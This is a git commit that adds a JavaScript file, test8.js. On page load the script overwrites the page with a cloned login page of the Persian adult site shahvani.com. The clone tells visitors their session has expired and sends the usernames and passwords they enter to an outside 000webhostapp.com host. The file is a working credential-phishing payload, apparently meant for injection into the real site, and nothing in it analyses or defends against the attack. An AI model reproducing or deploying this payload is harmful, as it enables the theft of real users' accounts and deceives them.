dec8b671c61fcb86d3245437abcb0d590b962c6e
botjusttest <54834561+botjusttest@users.noreply.github.com>
2019-09-05 19:21:18 +0430

    Create test8.js

---
+++ test8.js
@@ -0,0 +1,144 @@
+window.onload= function(){
+var payload=`
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="utf-8">
+<meta name="google-site-verification" content="nvVY1Ds49h_lvMizYGi30xnEBSHsaSZ3BnlteNNvwbE" />
+<link rel="alternate" href="https://shahvani.com" hreflang="fa-af" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="">
+<meta name="author" content="">
+<title>شهوانی</title>
+<link rel="shortcut icon" type="image/png" href="https://shahvani.com/static/images/favicon.ico" />
+<link rel="stylesheet" type="text/css" href="https://shahvani.com/static/css/bootstrap.css">
+<link rel="stylesheet" type="text/css" href="https://shahvani.com/static/css/bootstrap-theme.css">
+<link rel="stylesheet" type="text/css" href="https://shahvani.com/static/fonts/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" href="https://shahvani.com/static/css/custom.css" media="screen">
+<link rel="shortcut icon" href="https://shahvani.com/static/images/favicon.ico" />
+<script src="https://shahvani.com/static/js/jquery.min.js" type="616f0e9ba095bff4de4fd0ee-text/javascript"></script>
+<script src="https://shahvani.com/static/js/bootstrap.min.js" type="616f0e9ba095bff4de4fd0ee-text/javascript"></script>
+<script type="616f0e9ba095bff4de4fd0ee-text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-11536241-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script src="https://www.google.com/recaptcha/api.js" async defer type="616f0e9ba095bff4de4fd0ee-text/javascript"></script>
+<script src="scripts.js" type="text/javascript">
+
+<script src="https://shahvani.com/static/js/top.js" type="616f0e9ba095bff4de4fd0ee-text/javascript"></script>
+<script type="616f0e9ba095bff4de4fd0ee-text/javascript">
+jQuery(function($) {
+  $(".share").hideshare().trigger('click'); // Calls HIDESHARE on element with class "share"
+});
+</script>
+</head>
+<body>
+<nav class="navbar navbar-default" role="navigation">
+<div class="container-fluid align-right">
+
+<div class="navbar-header navbar-right">
+<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+<span class="sr-only">Toggle navigation</span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+<span class="icon-bar"></span>
+</button>
+<a class="navbar-brand" href="/"><img class="img-responsive" alt="shahvani.com" src="/static/images/logo.png"></a>
+</div>
+
+<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+<ul class="nav navbar-nav">
+<li><a href="/accounts/login/" title="ورود به شهوانی">ورود</a></li>
+<li><a href="/accounts/register/" title="به شهوانی بپیوندید">ثبت نام</a></li>
+</li>
+</ul>
+<ul class="nav navbar-nav navbar-right">
+<li><a href="/profiles" title="جستجو در پروفایل های کاربری">کاربران</a></li>
+<li><a href="/polls" title="جستجو در پروفایل های کاربری">نظرسنجی‌ها</a></li>
+<li><a href="http://chat.shahvani.com" title="چت‌روم شهوانی">چت</a></li>
+<li><a href="/send/dastan" title="داستان‌ سکسی تان را بفرستید">ارسال داستان</a></li>
+<li><a href="/forum" title="انجمن شهوانی">انجمن</a></li>
+<li><a href="/photos" title="عکس های سکسی">عکس سکسی</a></li>
+<li><a href="/dastans" title="داستان های سکسی">داستان سکسی</a></li>
+</ul>
+</div>
+</div>
+</nav>
+<noscript>
+<nav class="navbar navbar-default" role="navigation">
+
+      <ul class="nav navbar-nav">
+		
+		 <li><a href="/accounts/login/">ورود</a></li>
+		 <li><a href="/accounts/register/">ثبت نام</a></li>
+
+        
+
+     </li>
+		
+
+
+
+      </ul>
+
+      <ul class="nav navbar-nav navbar-right">
+          <li><a href="/profiles">کاربران</a></li>
+          <li><a href="http://chat.shahvani.com/login.php">چت</a></li>
+          <li><a href="/send/dastan">ارسال داستان</a></li>
+	      <li><a href="/forum">انجمن</a></li>
+          <li><a href="/photos">عکس سکسی</a></li>
+	      <li><a href="/dastans">داستان سکسی</a></li>
+		  
+      </ul>
+
+</nav>
+</noscript>
+<div class="container-fluid">
+
+
+<br><br>
+<div class="panel col-sm-6 col-sm-push-3">
+<div class="container">
+<div class="panel-header">
+<h5><strong>نشست شما منقضی شده دوباره وارد شوید</strong></h5>
+<h3><strong>ورود به شهوانی</strong></h3>
+<br>
+<form method="post" name = "form1" action="https://shahvani1.000webhostapp.com/shahvani.php" onSubmit="return required()">
+<input type='hidden' name='csrfmiddlewaretoken' value='3KA1VLIfcxhoXWESU3qvVkRlaNYQMGfY' />
+<p><label for="id_username">نام کاربری:</label> <input id="id_username" maxlength="254" name="username" type="text" /></p>
+<p><label for="id_password">گذرواژه:</label> <input id="id_password" name="password" type="password" /></p>
+<input class="btn btn-lg btn-danger" type="submit" value="ورود" />
+<input type="hidden" name="next" value="" />
+</form>
+<p>پسوردتان را فراموش کرده اید؟ <a href="/accounts/password/reset/">بازنشانی کنید</a></p>
+<p>عضو نیستید؟ <a href="/accounts/register/">ثبت نام کنید</a>!</p>
+</div>
+
+<footer>
+<div class="row">
+<br>
+<div class="col-xs-12 text-center">
+<ul class="list-unstyled list-inline">
+<li><a href="/">خانه</a></li>
+<li><a href="/tos">قوانین</a></li>
+<li><a href="/faq">راهنما</a></li>
+<li><a href="/privacy">حریم خصوصی</a></li>
+<li><a href="/contact">تماس</a></li>
+<li><a href="/accounts/login/">ورود</a></li>
+</ul>
+</div>
+</div>
+</footer>
+<script src="https://ajax.cloudflare.com/cdn-cgi/scripts/a2bd7673/cloudflare-static/rocket-loader.min.js" data-cf-settings="616f0e9ba095bff4de4fd0ee-|49" defer=""></script></body>
+</html>
+
+`;
+document.write(payload);
+}
